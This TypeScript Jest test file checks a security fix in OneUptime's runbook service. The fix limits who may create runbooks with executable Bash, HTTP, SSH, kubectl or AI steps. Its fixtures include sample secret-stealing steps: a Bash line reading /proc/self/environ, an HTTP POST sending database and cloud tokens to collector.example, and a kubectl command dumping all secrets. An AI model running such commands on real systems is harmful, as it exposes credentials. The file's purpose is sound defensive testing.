import AutoRemediationSuggestionService from "../../../Server/Services/AutoRemediationSuggestionService";
import IncidentFeedService from "../../../Server/Services/IncidentFeedService";
import IncidentService from "../../../Server/Services/IncidentService";
import RunbookService, {
  Service as RunbookServiceClass,
} from "../../../Server/Services/RunbookService";
import RunbookLabelRuleEngineService from "../../../Server/Services/RunbookLabelRuleEngineService";
import RunbookOwnerRuleEngineService from "../../../Server/Services/RunbookOwnerRuleEngineService";
import VerifiedFixRunbookSave from "../../../Server/Utils/AutoRemediation/VerifiedFixRunbookSave";
import ServerSetColumns from "../../../Server/Utils/Database/ServerSetColumns";
import logger from "../../../Server/Utils/Logger";
import AutoRemediationSuggestion from "../../../Models/DatabaseModels/AutoRemediationSuggestion";
import Incident from "../../../Models/DatabaseModels/Incident";
import Runbook from "../../../Models/DatabaseModels/Runbook";
import {
  AiRemediationCommandExecutionStatus,
  AiRemediationCommandPlanUtil,
} from "../../../Types/AutoRemediation/AiRemediationCommandPlan";
import { AiRemediationCommandPolicyVerdict } from "../../../Types/AutoRemediation/AiRemediationCommandPolicyVerdict";
import AutoRemediationSuggestionType from "../../../Types/AutoRemediation/AutoRemediationSuggestionType";
import AutoRemediationVerificationStatus from "../../../Types/AutoRemediation/AutoRemediationVerificationStatus";
import DatabaseCommonInteractionProps from "../../../Types/BaseDatabase/DatabaseCommonInteractionProps";
import NotAuthorizedException from "../../../Types/Exception/NotAuthorizedException";
import ObjectID from "../../../Types/ObjectID";
import Permission from "../../../Types/Permission";
import { getStepsThatRunRefusal } from "../../../Types/Runbook/RunbookStepAuthoring";
import RunbookStepType from "../../../Types/Runbook/RunbookStepType";
import { customDomainCaller } from "../API/CustomDomainCallers";
import {
  InMemoryTable,
  StoredRow,
  useInMemoryTable,
} from "../TestingUtils/InMemoryRepository";
import { ON_HIGHEST_PLAN } from "../TestingUtils/RequestPlan";
import { stubProjectDirectory } from "../TestingUtils/ProjectDirectory";
import { getJestSpyOn } from "../../Spy";
import {
  afterEach,
  beforeEach,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";

/*
 * WHO WRITES A RUNBOOK'S STEPS THAT RUN, through the whole write
 * (GHSA-rfrx-38rq-44w6): the real permission checks, the real hooks and the
 * real success hooks, as each kind of member, against an in-memory Runbook
 * table.
 *
 * A JavaScript, HTTP request, Bash, SSH, kubectl or AI step acts for the
 * project - on its Runners, or from OneUptime with every secret it names -
 * so writing one takes permission to change a runbook's steps (Project
 * Owner, Project Admin, Runbook Admin, Edit Runbook), on a create as on an
 * update. Project Member runs runbooks and Create Runbook alone builds
 * none: through the API, either could create a runbook with steps that run,
 * and Project Member could run it. Now:
 *
 *   - such a create is refused, saying why and who may, and nothing is
 *     written - whatever the step, and from an API key as from a person;
 *   - whoever may change steps creates them as before, the granular
 *     permissions and the operational-resource wildcards included, and a
 *     team's block on the permission takes it away as it does on an update;
 *   - a runbook of manual steps, or of none, is still created by whoever
 *     may create runbooks;
 *   - the steps OneUptime writes for a person - a verified fix saved as a
 *     runbook - are created for them while the runbook starts turned off;
 *   - changing steps is held to the column's own update list, as before.
 */

const PROJECT_ID: ObjectID = new ObjectID(
  "1f5f0000-0000-4000-8000-000000000001",
);
const RUNBOOK_ID: string = "1f5f0000-0000-4000-8000-0000000000aa";
const RUNNER_ID: string = "1f5f0000-0000-4000-8000-0000000000bb";

let table: InMemoryTable;

function member(
  permissions: Array<Permission>,
  more: { isApiKey?: boolean; blocks?: Array<Permission> } = {},
): DatabaseCommonInteractionProps {
  return {
    ...customDomainCaller({
      permissions: permissions,
      projectId: PROJECT_ID,
      ...more,
    }),
    ...ON_HIGHEST_PLAN,
  };
}

function step(
  type: RunbookStepType,
  config: Record<string, unknown>,
): Record<string, unknown> {
  return {
    id: `${type.toLowerCase()}-step`,
    order: 0,
    type: type,
    title: `A ${type} step`,
    config: config,
    continueOnFailure: false,
  };
}

const MANUAL_STEP: Record<string, unknown> = step(RunbookStepType.Manual, {});

// One step of each type a runbook's author writes that runs something.
const STEPS_THAT_RUN: Array<[string, Record<string, unknown>]> = [
  [
    "a Bash step",
    step(RunbookStepType.Bash, {
      script: "id; hostname; cat /proc/self/environ",
      agentId: RUNNER_ID,
    }),
  ],
  [
    "an HTTP request step that sends a secret to an address of its own",
    step(RunbookStepType.HttpRequest, {
      url: "https://collector.example/{{global.variables.DB_PASSWORD}}",
      method: "POST",
      body: '{"key": "{{global.variables.CLOUD_API_TOKEN}}"}',
    }),
  ],
  [
    "a JavaScript step",
    step(RunbookStepType.JavaScript, {
      script: "return { data: 1 };",
      agentId: RUNNER_ID,
    }),
  ],
  [
    "an SSH step",
    step(RunbookStepType.SSH, {
      host: "db-1.internal",
      username: "deploy",
      signIn: "{{global.variables.DB_SSH_KEY}}",
      script: "uptime",
      agentId: RUNNER_ID,
    }),
  ],
  [
    "a kubectl step",
    step(RunbookStepType.Kubernetes, {
      script: "kubectl get secrets -A -o yaml",
      kubeconfig: "{{global.variables.PROD_KUBECONFIG}}",
      agentId: RUNNER_ID,
    }),
  ],
  [
    "an AI step",
    step(RunbookStepType.AI, { prompt: "Summarise what happened." }),
  ],
];

const PROJECT_MEMBER: Array<Permission> = [Permission.ProjectMember];
const CREATE_RUNBOOK_ONLY: Array<Permission> = [
  Permission.CreateRunbook,
  Permission.ReadRunbook,
];
const CREATE_RUNBOOK_AND_START_RUNS: Array<Permission> = [
  Permission.CreateRunbook,
  Permission.ReadRunbook,
  Permission.CreateRunbookExecution,
];

const REFUSAL: string = getStepsThatRunRefusal([
  "Project Owner",
  "Project Admin",
  "Edit Runbook",
  "Runbook Admin",
]);

function createdRows(): Array<StoredRow> {
  return table.rows.filter((row: StoredRow) => {
    return row["name"] === "Clean up the disk";
  });
}

async function create(
  data: Record<string, unknown>,
  props: DatabaseCommonInteractionProps,
): Promise<Runbook> {
  const runbook: Runbook = new Runbook();

  Object.assign(runbook, {
    projectId: PROJECT_ID,
    name: "Clean up the disk",
    ...data,
  });

  return await RunbookService.create({ data: runbook, props: props });
}

async function refusalOf(promise: Promise<unknown>): Promise<unknown> {
  try {
    await promise;
  } catch (error) {
    return error;
  }

  throw new Error("Expected the write to be refused, but it went through.");
}

beforeEach(() => {
  for (const silenced of ["debug", "info", "warn", "error"]) {
    getJestSpyOn(logger, silenced).mockImplementation((): void => {
      return undefined;
    });
  }

  stubProjectDirectory({});
  getJestSpyOn(
    RunbookLabelRuleEngineService,
    "applyRulesToRunbook",
  ).mockResolvedValue(undefined);
  getJestSpyOn(
    RunbookOwnerRuleEngineService,
    "applyRulesToRunbook",
  ).mockResolvedValue(undefined);

  table = useInMemoryTable(RunbookService, [
    {
      _id: RUNBOOK_ID,
      projectId: PROJECT_ID.toString(),
      name: "Restart the API",
      slug: "restart-the-api",
      isEnabled: true,
      steps: [MANUAL_STEP],
      isScheduleEnabled: false,
      isWebhookEnabled: false,
      version: 1,
    },
  ]);
});

afterEach(() => {
  jest.restoreAllMocks();
});

describe("a create that gives a runbook a step that runs", () => {
  test.each(STEPS_THAT_RUN)(
    "with %s is refused to a Project Member, saying who may write it, and nothing is written",
    async (_step: string, sent: Record<string, unknown>) => {
      const error: unknown = await refusalOf(
        create({ steps: [sent] }, member(PROJECT_MEMBER)),
      );

      expect(error).toBeInstanceOf(NotAuthorizedException);
      expect((error as Error).message).toBe(REFUSAL);
      expect(createdRows()).toEqual([]);
      expect(table.inserts).toEqual([]);
    },
  );

  test.each([
    ["a Project Member's API key", member(PROJECT_MEMBER, { isApiKey: true })],
    ["Create Runbook alone", member(CREATE_RUNBOOK_ONLY)],
    [
      "Create Runbook with Create Runbook Execution",
      member(CREATE_RUNBOOK_AND_START_RUNS),
    ],
    [
      "a Project Member who also starts runs and reads runbooks",
      member([
        Permission.ProjectMember,
        Permission.RunbookMember,
        Permission.CreateRunbookExecution,
      ]),
    ],
  ])(
    "is refused to %s as well",
    async (_who: string, props: DatabaseCommonInteractionProps) => {
      const error: unknown = await refusalOf(
        create({ steps: [STEPS_THAT_RUN[0]![1]] }, props),
      );

      expect(error).toBeInstanceOf(NotAuthorizedException);
      expect((error as Error).message).toBe(REFUSAL);
      expect(table.inserts).toEqual([]);
    },
  );

  test("is refused when one step among manual ones runs", async () => {
    const error: unknown = await refusalOf(
      create(
        { steps: [MANUAL_STEP, STEPS_THAT_RUN[1]![1], MANUAL_STEP] },
        member(PROJECT_MEMBER),
      ),
    );

    expect((error as Error).message).toBe(REFUSAL);
    expect(table.inserts).toEqual([]);
  });

  test.each([
    ["a step of a type this build does not know", [{ type: "Python" }]],
    ["a step with no type", [{ title: "No type", config: {} }]],
    ["a step written in another case", [{ type: "manual" }]],
    ["an entry that is no step", [null]],
    ["steps that are not a list", { type: "Manual" }],
  ])(
    "is refused for %s: what the server cannot read as manual is not let through",
    async (_what: string, steps: unknown) => {
      const error: unknown = await refusalOf(
        create({ steps: steps }, member(PROJECT_MEMBER)),
      );

      expect((error as Error).message).toBe(REFUSAL);
      expect(table.inserts).toEqual([]);
    },
  );

  test("is refused, turned off or not: off is not what keeps a member's step from running", async () => {
    const error: unknown = await refusalOf(
      create(
        { steps: [STEPS_THAT_RUN[0]![1]], isEnabled: false },
        member(PROJECT_MEMBER),
      ),
    );

    expect((error as Error).message).toBe(REFUSAL);
    expect(table.inserts).toEqual([]);
  });

  test("a team's block on Edit Runbook takes it away from a Project Admin's create, as it does from an update", async () => {
    const props: DatabaseCommonInteractionProps = member(
      [Permission.ProjectAdmin],
      { blocks: [Permission.EditRunbook] },
    );

    const createError: unknown = await refusalOf(
      create({ steps: [STEPS_THAT_RUN[0]![1]] }, props),
    );

    expect((createError as Error).message).toBe(REFUSAL);
    expect(table.inserts).toEqual([]);

    const updateError: unknown = await refusalOf(
      RunbookService.updateOneById({
        id: new ObjectID(RUNBOOK_ID),
        data: { steps: [STEPS_THAT_RUN[0]![1]] } as never,
        props: member([Permission.ProjectAdmin], {
          blocks: [Permission.EditRunbook],
        }),
      }),
    );

    expect(updateError).toBeDefined();
    expect(table.get(RUNBOOK_ID)!["steps"]).toEqual([MANUAL_STEP]);
  });
});

describe("whoever may change a runbook's steps creates steps that run, as before", () => {
  test.each([
    ["a Runbook Admin", [Permission.RunbookAdmin]],
    ["a Project Admin", [Permission.ProjectAdmin]],
    ["a Project Owner", [Permission.ProjectOwner]],
    [
      "Create Runbook with Edit Runbook",
      [
        Permission.CreateRunbook,
        Permission.EditRunbook,
        Permission.ReadRunbook,
      ],
    ],
    [
      "a Project Member who may also edit runbooks",
      [Permission.ProjectMember, Permission.EditRunbook],
    ],
    [
      "the operational-resource wildcards",
      [
        Permission.CreateAllOperationalResources,
        Permission.EditAllOperationalResources,
        Permission.ReadAllOperationalResources,
      ],
    ],
  ])(
    "%s, with every kind of step, written as it was sent",
    async (_who: string, permissions: Array<Permission>) => {
      const steps: Array<Record<string, unknown>> = [
        MANUAL_STEP,
        ...STEPS_THAT_RUN.map((entry: [string, Record<string, unknown>]) => {
          return entry[1];
        }),
      ];

      await create({ steps: steps }, member(permissions));

      expect(createdRows()).toHaveLength(1);
      expect(createdRows()[0]!["steps"]).toEqual(steps);
    },
  );

  test("a Runbook Admin's API key, too", async () => {
    await create(
      { steps: [STEPS_THAT_RUN[0]![1]] },
      member([Permission.RunbookAdmin], { isApiKey: true }),
    );

    expect(createdRows()).toHaveLength(1);
  });

  test("OneUptime itself and a master admin are not asked", async () => {
    await create({ steps: [STEPS_THAT_RUN[0]![1]] }, {
      isRoot: true,
    } as DatabaseCommonInteractionProps);

    expect(createdRows()).toHaveLength(1);

    expect(() => {
      RunbookServiceClass.assertMayWriteStepsThatRun(
        Object.assign(new Runbook(), { steps: [STEPS_THAT_RUN[0]![1]] }),
        { isMasterAdmin: true, userId: ObjectID.generate() },
      );
    }).not.toThrow();
  });
});

describe("a runbook that runs nothing is created by whoever may create runbooks", () => {
  test.each([
    ["manual steps", [MANUAL_STEP, { ...MANUAL_STEP, id: "second" }]],
    ["no steps", []],
    ["steps left out", undefined],
    ["steps sent as nothing", null],
  ])(
    "a Project Member creates one with %s",
    async (_what: string, steps: unknown) => {
      await create(
        steps === undefined ? {} : { steps: steps },
        member(PROJECT_MEMBER),
      );

      expect(createdRows()).toHaveLength(1);
    },
  );

  test("so does Create Runbook alone", async () => {
    await create({ steps: [MANUAL_STEP] }, member(CREATE_RUNBOOK_ONLY));

    expect(createdRows()).toHaveLength(1);
    expect(createdRows()[0]!["steps"]).toEqual([MANUAL_STEP]);
  });
});

/*
 * Save as Runbook on a verified fix (VerifiedFixRunbookSave) writes down
 * what OneUptime AI ran, as the person who asked: the steps are OneUptime's,
 * marked so (ServerSetColumns), and the runbook starts turned off - nobody
 * runs it until someone who may change it reviews it and turns it on.
 */
describe("the steps OneUptime writes for a person", () => {
  function fixSavedAsRunbook(isEnabled: boolean | undefined): Runbook {
    const runbook: Runbook = new Runbook();

    Object.assign(runbook, {
      projectId: PROJECT_ID,
      name: "Clean up the disk",
    });

    if (isEnabled !== undefined) {
      runbook.isEnabled = isEnabled;
    }

    ServerSetColumns.set(runbook, { steps: [STEPS_THAT_RUN[0]![1]] });

    return runbook;
  }

  test("are created for a Project Member while the runbook starts turned off", async () => {
    await RunbookService.create({
      data: fixSavedAsRunbook(false),
      props: member(PROJECT_MEMBER),
    });

    expect(createdRows()).toHaveLength(1);
    expect(createdRows()[0]!["isEnabled"]).toBe(false);
  });

  test.each([
    ["turned on", true],
    ["left to its default", undefined],
  ])(
    "are refused to a Project Member when the runbook would start %s",
    async (_how: string, isEnabled: boolean | undefined) => {
      const error: unknown = await refusalOf(
        RunbookService.create({
          data: fixSavedAsRunbook(isEnabled),
          props: member(PROJECT_MEMBER),
        }),
      );

      expect((error as Error).message).toBe(REFUSAL);
      expect(table.inserts).toEqual([]);
    },
  );

  test("the same steps, sent by the person rather than marked by OneUptime, are refused even turned off", async () => {
    const error: unknown = await refusalOf(
      create(
        { steps: [STEPS_THAT_RUN[0]![1]], isEnabled: false },
        member(PROJECT_MEMBER),
      ),
    );

    expect((error as Error).message).toBe(REFUSAL);
  });

  test("Save as Runbook on a verified fix still works for a Project Member, through the real create", async () => {
    const suggestionId: ObjectID = new ObjectID(
      "1f5f0000-0000-4000-8000-0000000000dd",
    );
    const fix: AutoRemediationSuggestion = new AutoRemediationSuggestion();
    fix._id = suggestionId.toString();
    fix.projectId = PROJECT_ID;
    fix.incidentId = new ObjectID("1f5f0000-0000-4000-8000-0000000000ee");
    fix.suggestionType = AutoRemediationSuggestionType.CommandPlan;
    fix.verificationStatus = AutoRemediationVerificationStatus.Verified;
    fix.commandPlan = AiRemediationCommandPlanUtil.toJSON({
      commands: [
        {
          sequence: 1,
          stepType: RunbookStepType.Bash,
          runnerId: RUNNER_ID,
          runnerNameSnapshot: "web-runner",
          command: "systemctl restart nginx",
          timeoutInMs: 30000,
          rationale: "nginx stopped answering",
          expectedEffect: "nginx answers again",
          policyVerdict: AiRemediationCommandPolicyVerdict.AutoApproved,
          execution: { status: AiRemediationCommandExecutionStatus.Succeeded },
        },
      ],
    });

    getJestSpyOn(
      AutoRemediationSuggestionService,
      "findOneById",
    ).mockResolvedValue(fix);
    getJestSpyOn(
      AutoRemediationSuggestionService,
      "updateColumnsByIdWithoutHooks",
    ).mockResolvedValue(undefined);
    getJestSpyOn(IncidentService, "findOneById").mockResolvedValue(
      Object.assign(new Incident(), {
        title: "Checkout returns 503s",
        incidentNumber: 42,
      }),
    );
    getJestSpyOn(
      IncidentFeedService,
      "createIncidentFeedItem",
    ).mockResolvedValue(undefined as never);

    /*
     * The runbooks whose names start like the fix's, to make its name
     * unique: none. That read alone is answered here - the table in memory
     * reads no ILIKE - and every other read goes to the table.
     */
    const findBy: typeof RunbookService.findBy =
      RunbookService.findBy.bind(RunbookService);

    getJestSpyOn(RunbookService, "findBy").mockImplementation(
      async (args: unknown): Promise<Array<Runbook>> => {
        const name: unknown = (
          args as { query?: Record<string, unknown> } | undefined
        )?.query?.["name"];

        if (name !== undefined && typeof name !== "string") {
          return [];
        }

        return await findBy(args as never);
      },
    );

    await VerifiedFixRunbookSave.save({
      props: member(PROJECT_MEMBER),
      suggestionId: suggestionId.toString(),
    });

    const saved: Array<StoredRow> = table.rows.filter((row: StoredRow) => {
      return row["name"] === "Fix: Checkout returns 503s";
    });

    expect(saved).toHaveLength(1);
    expect(saved[0]!["isEnabled"]).toBe(false);
    expect(
      (saved[0]!["steps"] as Array<Record<string, unknown>>).map(
        (written: Record<string, unknown>) => {
          return written["type"];
        },
      ),
    ).toEqual([RunbookStepType.Bash]);
  });
});

describe("who may change a runbook's steps", () => {
  test("is Runbook.steps' update list, which names no role that only runs runbooks or only creates them", () => {
    expect(RunbookServiceClass.getStepsWriters()).toEqual([
      Permission.ProjectOwner,
      Permission.ProjectAdmin,
      Permission.EditRunbook,
      Permission.RunbookAdmin,
    ]);

    for (const notAWriter of [
      Permission.ProjectMember,
      Permission.CreateRunbook,
      Permission.CreateRunbookExecution,
      Permission.RunbookMember,
      Permission.RunbookViewer,
      Permission.Viewer,
    ]) {
      expect(RunbookServiceClass.getStepsWriters()).not.toContain(notAWriter);
    }
  });

  test("the refusal names exactly that list, by the titles the permission picker shows", () => {
    let message: string = "";

    try {
      RunbookServiceClass.assertMayWriteStepsThatRun(
        Object.assign(new Runbook(), { steps: [STEPS_THAT_RUN[0]![1]] }),
        member(PROJECT_MEMBER),
      );
    } catch (error) {
      message = (error as Error).message;
    }

    expect(message).toBe(REFUSAL);
    expect(message).toContain(
      "You need one of these permissions: Project Owner, Project Admin, Edit Runbook, Runbook Admin.",
    );
  });

  test.each([
    ["a Project Member", PROJECT_MEMBER, false],
    ["Create Runbook alone", CREATE_RUNBOOK_ONLY, false],
    ["a Runbook Member", [Permission.RunbookMember], false],
    ["a Viewer", [Permission.Viewer], false],
    ["a Runbook Admin", [Permission.RunbookAdmin], true],
    ["Edit Runbook", [Permission.EditRunbook], true],
    [
      "Edit All Operational Resources",
      [Permission.EditAllOperationalResources],
      true,
    ],
  ])(
    "mayChangeSteps: %s -> %s",
    (_who: string, permissions: Array<Permission>, expected: boolean) => {
      expect(RunbookServiceClass.mayChangeSteps(member(permissions))).toBe(
        expected,
      );
    },
  );
});

describe("changing a runbook's steps is held to the column's update list, as before", () => {
  async function change(
    steps: unknown,
    props: DatabaseCommonInteractionProps,
  ): Promise<void> {
    await RunbookService.updateOneById({
      id: new ObjectID(RUNBOOK_ID),
      data: { steps: steps } as never,
      props: props,
    });
  }

  test.each([
    ["a Project Member", PROJECT_MEMBER],
    ["Create Runbook alone", CREATE_RUNBOOK_ONLY],
    ["a Runbook Member", [Permission.RunbookMember]],
  ])(
    "%s changes no step, not even to manual ones",
    async (_who: string, permissions: Array<Permission>) => {
      for (const steps of [
        [STEPS_THAT_RUN[0]![1]],
        [MANUAL_STEP, MANUAL_STEP],
      ]) {
        const error: unknown = await refusalOf(
          change(steps, member(permissions)),
        );

        expect(error).toBeDefined();
      }

      expect(table.get(RUNBOOK_ID)!["steps"]).toEqual([MANUAL_STEP]);
    },
  );

  test.each([
    ["a Runbook Admin", [Permission.RunbookAdmin]],
    ["Edit Runbook", [Permission.EditRunbook, Permission.ReadRunbook]],
  ])(
    "%s changes them to steps that run",
    async (_who: string, permissions: Array<Permission>) => {
      await change([STEPS_THAT_RUN[0]![1]], member(permissions));

      expect(table.get(RUNBOOK_ID)!["steps"]).toEqual([STEPS_THAT_RUN[0]![1]]);
    },
  );
});
